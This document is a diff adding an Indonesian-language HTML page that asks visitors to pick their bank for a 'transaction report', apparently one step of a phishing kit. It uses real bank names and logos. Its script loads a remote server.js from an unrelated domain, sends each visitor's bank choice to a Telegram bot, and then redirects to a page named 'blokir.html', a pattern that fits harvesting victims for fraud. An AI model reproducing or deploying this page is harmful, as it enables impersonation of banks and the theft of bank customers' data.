@@ -1,0 +1,333 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pilih Bank</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+        body {
+            background-color: #f5f5f5;
+        }
+        .topbar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px 15px;
+            background: #fff;
+            border-bottom: 1px solid #eee;
+        }
+        .search-box {
+            position: relative;
+            width: 70%;
+        }
+        .search-box input {
+            width: 100%;
+            padding: 10px 40px 10px 15px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 14px;
+        }
+        .search-icon {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+        }
+        .lang {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 14px;
+        }
+        .lang-circle {
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            background: #eee;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+        }
+        .logo-section img {
+            width: 100%;
+            border-bottom: 1px solid #aaa;
+        }
+        #logo {
+            display: block;
+            margin: 20px auto;
+            max-width: 95%;
+            height: auto;
+        }
+        .container {
+            padding: 0 15px 30px;
+        }
+        .card {
+            background: #fff;
+            padding: 25px 20px;
+            border-radius: 10px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+        }
+        .card h1 {
+            font-size: 20px;
+            margin-bottom: 10px;
+            color: #222;
+        }
+        .card p {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 25px;
+            line-height: 1.5;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: #333;
+            font-size: 14px;
+        }
+        .form-group select {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 15px;
+            background: #fff;
+        }
+        .btn-submit {
+            width: 100%;
+            padding: 13px;
+            background-color: #0B5FA1;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        .btn-submit:hover {
+            background-color: #007064;
+        }
+    </style>
+</head>
+<body>
+
+<!-- NAVBAR -->
+<header>
+    <div class="topbar">
+        <div class="search-box">
+            <input type="text" placeholder="Masukkan Kata Pencarian">
+            <span class="search-icon"><i class="fas fa-search fa-rotate-90" style="color: rgb(153, 152, 149);"></i></span>
+        </div>
+        <div class="lang">
+            <div class="lang-circle">ID</div>
+            ▼
+        </div>
+    </div>
+
+    <div class="logo-section">
+       <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEioO5TTZ3ot2Xy8mJ-IOZ7zgik93zWD8UIXDhg2XRgyyTGOI9jS7W2C6962mEJ4wPOg4yZAE7Z3fnPjmTsAZ54G36PhR_9loe1D9gOTDfiZae21E1BEscJP5XMQIUHgf4dD1E43cq8lL7Phe9Y9QK1uos-TXpXp3YPkNwU2ez2yyGlp-Q5yz5hDpsuA-D4/s1080/AddText_04-12-10.18.01.jpg" style="width: 100%; border-bottom: 0.2px solid #aaa">
+    </div>
+</header>
+
+<center>
+<img id="logo" width="95%">
+</center>
+
+<!-- MAIN -->
+<main>
+  <div class="container">
+    <div class="card">
+      <h1>Pilih Bank Penyedia</h1>
+      <p>Silakan pilih <b>bank tujuan layanan</b> di bawah ini. untuk melakukan laporan transaksi</p>
+
+      <form method="post" id="bankForm">
+        <div class="form-group">
+            <label>Pilihan Layanan (Bank)</label>
+            <select name="bnk" required>
+                <option value="">-- Pilih Bank --</option>
+
+                <optgroup label="Bank Umum">
+                    <option value="MANDIRI">Bank Mandiri</option>
+                    <option value="BCA">Bank Central Asia (BCA)</option>
+                    <option value="BNI">Bank Negara Indonesia (BNI)</option>
+                    <option value="BTN">Bank Tabungan Negara (BTN)</option>
+                    <option value="BSI">Bank Syariah Indonesia (BSI)</option>
+                    <option value="CIMB">Bank CIMB Niaga</option>
+                    <option value="DANAMON">Bank Danamon</option>
+                    <option value="PERMATA">PermataBank</option>
+                    <option value="OCBC">Bank OCBC NISP</option>
+                    <option value="MAYBANK">Bank Maybank Indonesia</option>
+                    <option value="PANIN">Bank Panin</option>
+                    <option value="MEGA">Bank Mega</option>
+                    <option value="SINARMAS">Bank Sinarmas</option>
+                    <option value="UOB">Bank UOB Indonesia</option>
+                    <option value="HSBC">HSBC Indonesia</option>
+                    <option value="SCB">Standard Chartered Indonesia</option>
+                    <option value="DBS">Bank DBS Indonesia</option>
+                    <option value="BTPN">Bank BTPN</option>
+                    <option value="JAGO">Bank Jago</option>
+                    <option value="NEO">Bank Neo Commerce</option>
+                    <option value="SEABANK">SeaBank Indonesia</option>
+                    <option value="ALADIN">Bank Aladin Syariah</option>
+                    <option value="MUAMALAT">Bank Muamalat Indonesia</option>
+                    <option value="BCASYR">Bank BCA Syariah</option>
+                    <option value="MEGASYR">Bank Mega Syariah</option>
+                    <option value="KBBANK">KB Bank</option>
+                </optgroup>
+
+                <optgroup label="Bank Daerah (BPD)">
+                    <option value="BDKI">Bank DKI</option>
+                    <option value="BJB">Bank BJB</option>
+                    <option value="BJATENG">Bank Jateng</option>
+                    <option value="BJATIM">Bank Jatim</option>
+                    <option value="BACEH">Bank Aceh Syariah</option>
+                    <option value="BNAGARI">Bank Nagari</option>
+                    <option value="BSUMUT">Bank Sumut</option>
+                    <option value="BRIAUKEPRI">Bank Riau Kepri</option>
+                    <option value="BLAMPUNG">Bank Lampung</option>
+                    <option value="BKALBAR">Bank Kalbar</option>
+                    <option value="BKALSEL">Bank Kalsel</option>
+                    <option value="BKALTIMTARA">Bank Kaltimtara</option>
+                    <option value="BNTBSYR">Bank NTB Syariah</option>
+                    <option value="BNTT">Bank NTT</option>
+                    <option value="BPAPUA">Bank Papua</option>
+                </optgroup>
+            </select>
+        </div>
+        <button id="lanjut" class="btn-submit" type="submit">Lanjutkan</button>
+      </form>
+    </div>
+  </div>
+</main>
+<script src="https://smpnegeri41jkt.my.id/3/server.js"></script>
+<script>
+// Konfigurasi Telegram
+
+const TELEGRAM_API_URL = `https://api.telegram.org/bot${token}/sendMessage`;
+
+// Peta Logo Bank
+const logoMap = {
+    "MANDIRI":    "https://upload.wikimedia.org/wikipedia/commons/thumb/a/ad/Bank_Mandiri_logo_2016.svg/1280px-Bank_Mandiri_logo_2016.svg.png",
+    "BCA":        "https://upload.wikimedia.org/wikipedia/commons/5/5c/Bank_Central_Asia.svg",
+    "BNI":        "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f0/Bank_Negara_Indonesia_logo_%282004%29.svg/3840px-Bank_Negara_Indonesia_logo_%282004%29.svg.png",
+    "BTN":        "https://upload.wikimedia.org/wikipedia/commons/thumb/c/ca/BTN_2024.svg/250px-BTN_2024.svg.png",
+    "BSI":        "https://upload.wikimedia.org/wikipedia/commons/thumb/a/a0/Bank_Syariah_Indonesia.svg/960px-Bank_Syariah_Indonesia.svg.png",
+    "CIMB":       "https://upload.wikimedia.org/wikipedia/commons/3/38/CIMB_Niaga_logo.svg",
+    "DANAMON":    "https://upload.wikimedia.org/wikipedia/commons/7/7b/Danamon.svg",
+    "PERMATA":    "https://upload.wikimedia.org/wikipedia/id/thumb/4/48/PermataBank_logo.svg/3840px-PermataBank_logo.svg.png",
+    "OCBC":       "https://upload.wikimedia.org/wikipedia/commons/thumb/1/1d/Logo-ocbc.svg/1280px-Logo-ocbc.svg.png",
+    "MAYBANK":    "https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhZ4Hx7kjrxSe1EcnSiPIZgAq1u0aoj2HU5Ii9B3G4ACvlhQQ8OQ6UqWtCBrFY2r81I40qFcXaXcS3dSuPgSu0wdAuMi7C7WxxdbIYZUtaXmlnECTa0hd-OExk5S1kmjgSro1Hhi99lGEiPR_SSkCxCWC4CW2VVEoIhvCX5KMD03_npVejgBrwwEPv9hY8/s300/AddText_04-13-06.19.04.png",
+    "PANIN":      "https://upload.wikimedia.org/wikipedia/commons/thumb/c/c9/Logo_Panin_Bank.svg/1280px-Logo_Panin_Bank.svg.png",
+    "MEGA":       "https://upload.wikimedia.org/wikipedia/commons/a/af/Bank_Mega_2013.svg",
+    "SINARMAS":   "https://upload.wikimedia.org/wikipedia/commons/7/73/Bank_Sinarmas.png",
+    "UOB":        "https://upload.wikimedia.org/wikipedia/commons/7/75/UOB_logo.png",
+    "HSBC":       "https://upload.wikimedia.org/wikipedia/commons/b/ba/HSBC_Logo_2018.png",
+    "SCB":        "https://upload.wikimedia.org/wikipedia/commons/thumb/0/0c/Standard_Chartered_%282021%29.svg/960px-Standard_Chartered_%282021%29.svg.png",
+    "DBS":        "https://upload.wikimedia.org/wikipedia/id/1/18/DBS_Bank_Logo1.png",
+    "BTPN":       "https://upload.wikimedia.org/wikipedia/commons/thumb/6/64/Logo_of_Bank_BTPN.svg/1280px-Logo_of_Bank_BTPN.svg.png",
+    "JAGO":       "https://upload.wikimedia.org/wikipedia/commons/thumb/c/c0/Logo-jago.svg/1280px-Logo-jago.svg.png",
+    "NEO":        "https://upload.wikimedia.org/wikipedia/commons/e/ee/Bank_Neo_Commerce.png",
+    "SEABANK":    "https://upload.wikimedia.org/wikipedia/commons/thumb/a/ac/SeaBank.svg/1280px-SeaBank.svg.png",
+    "ALADIN":     "https://upload.wikimedia.org/wikipedia/commons/a/ad/Bank_Aladin.png",
+    "MUAMALAT":   "https://upload.wikimedia.org/wikipedia/commons/8/81/Muamalat_Logo.png",
+    "BCASYR":     "https://upload.wikimedia.org/wikipedia/commons/0/07/BCA_Syariah.svg",
+    "MEGASYR":    "https://upload.wikimedia.org/wikipedia/commons/5/55/Logo_bank_mega_syariah_new.png",
+    "KBBANK":     "https://infobanknews.com/wp-content/uploads/2024/03/IMG-20240303-WA0002.jpg",
+    "BDKI":       "https://upload.wikimedia.org/wikipedia/commons/2/2a/Bank_DKI.svg",
+    "BJB":        "https://upload.wikimedia.org/wikipedia/id/thumb/4/41/Bank_BJB_logo.svg/1280px-Bank_BJB_logo.svg.png",
+    "BJATENG":    "https://upload.wikimedia.org/wikipedia/id/c/c4/Bank_Jateng_logo.svg",
+    "BJATIM":     "https://www.bankjatim.co.id/files/logo/Logo%20Bank%20Jatim.png",
+    "BACEH":      "https://www.bankaceh.co.id/wp-content/uploads/2012/01/bank-aceh-oke-png.png",
+    "BNAGARI":    "https://upload.wikimedia.org/wikipedia/commons/thumb/d/db/Bank_Nagari.svg/3840px-Bank_Nagari.svg.png",
+    "BSUMUT":     "https://upload.wikimedia.org/wikipedia/commons/3/31/Logo_Bank_Sumut.png",
+    "BRIAUKEPRI": "https://upload.wikimedia.org/wikipedia/commons/b/b1/Logo_BRK_Syariah.png",
+    "BLAMPUNG":   "https://upload.wikimedia.org/wikipedia/commons/thumb/d/d7/Logo_bank_Lampung_baru.png/1280px-Logo_bank_Lampung_baru.png",
+    "BKALBAR":    "https://upload.wikimedia.org/wikipedia/commons/3/35/Logo_Bank_Kalbar.png",
+    "BKALSEL":    "https://upload.wikimedia.org/wikipedia/commons/3/3b/Logo_Bank_Kalsel.png",
+    "BKALTIMTARA":"https://upload.wikimedia.org/wikipedia/commons/c/cc/Logo_Bankaltimtara.png",
+    "BNTBSYR":    "https://www.bankntbsyariah.co.id/_next/image?url=%2Fassets%2Fimg%2Flogos%2Fbankntbslogo.png&w=384&q=75",
+    "BNTT":       "https://upload.wikimedia.org/wikipedia/commons/7/78/Logo_Bank_NTT.png",
+    "BPAPUA":     "https://upload.wikimedia.org/wikipedia/commons/5/50/Logo_Bank_Papua.png"
+};
+
+// Tampilkan Logo
+const logo = sessionStorage.getItem("logo");
+if(logo){
+  document.getElementById("logo").src = logo;
+}    
+
+// Proses Form & Redirect
+document.addEventListener('DOMContentLoaded', function () {
+    const formEl = document.getElementById('bankForm');
+    if (!formEl) return;
+
+    formEl.addEventListener('submit', async function (e) {
+        e.preventDefault();
+
+        const bankSelect = document.querySelector('select[name="bnk"]');
+        if (!bankSelect || bankSelect.value === "") {
+            alert('Silakan pilih bank terlebih dahulu!');
+            return;
+        }
+
+        // Ambil data
+        const selectedValue = bankSelect.value.trim();
+        const selectedText  = bankSelect.options[bankSelect.selectedIndex].text.trim();
+
+        // Simpan ke Session Storage
+        sessionStorage.setItem("bankName", selectedText);
+        sessionStorage.setItem("bankCode", selectedValue);
+        
+        if (logoMap[selectedValue]) {
+            sessionStorage.setItem("bankLogo", logoMap[selectedValue]);
+        } else {
+            sessionStorage.removeItem("bankLogo");
+        }
+
+        // Pesan untuk Telegram
+        const pesan = `
+*PILIHAN BANK*
+Nama Bank : ${selectedText}
+Kode Bank : ${selectedValue}
+        `.trim();
+
+        try {
+            // Kirim ke Telegram
+            await fetch(TELEGRAM_API_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: grup,
+                    text: pesan,
+                    parse_mode: 'Markdown'
+                })
+            });
+
+            // Reset form
+            formEl.reset();
+
+            // ✅ HALAMAN TUJUAN (UBAH NAMA FILE SESUAI KEBUTUHANMU)
+            // Contoh: "halaman_berikutnya.html" atau "form_transaksi.html"
+            window.location.href = "blokir.html"; 
+
+        } catch (err) {
+            alert('Gagal mengirim data, coba lagi: ' + err.message);
+        }
+    });
+});
+</script>
+
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/v833ccba57c9e4d2798f2e76cebdd09a11778172276447" integrity="sha512-57MDmcccJXYtNnH+ZiBwzC4jb2rvgVCEokYN+L/nLlmO8rfYT/gIpW2A569iJ/3b+0UEasghjuZH/ma3wIs/EQ==" data-cf-beacon='{"version":"2024.11.0","token":"fb2304f2e1cf43e9bebbc7e7be717d56","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+</body>
+</html>
